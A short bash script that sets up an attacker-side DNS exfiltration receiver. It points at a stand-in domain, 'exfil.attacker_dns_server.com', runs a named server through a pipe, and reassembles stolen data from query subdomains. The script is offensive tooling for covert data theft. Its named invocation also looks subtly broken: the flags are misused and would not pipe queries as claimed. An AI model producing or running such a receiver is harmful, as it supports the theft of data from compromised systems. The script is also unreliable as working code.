#!/bin/bash

# Set the DNS server IP and port
DNS_SERVER_IP="192.168.1.100"
DNS_SERVER_PORT=53

# Set the exfiltration domain
EXFIL_DOMAIN="exfil.attacker_dns_server.com"

# Set the output file for the reconstructed data
OUTPUT_FILE="reconstructed_data.txt"

# Create a named pipe for the DNS server to write to
mkfifo /tmp/dns_pipe

# Start the DNS server in the background, writing to the named pipe
named -c /etc/named.conf -p $DNS_SERVER_PORT -u named -g named -f /tmp/dns_pipe &

# Read from the named pipe and reconstruct the data
while IFS= read -r line; do
  # Extract the subdomain from the DNS query
  subdomain=$(echo "$line" | awk '{print $1}' | cut -d'.' -f1)

  # Append the subdomain to the output file
  echo -n "$subdomain" >> $OUTPUT_FILE
done < /tmp/dns_pipe

# Clean up
rm /tmp/dns_pipe
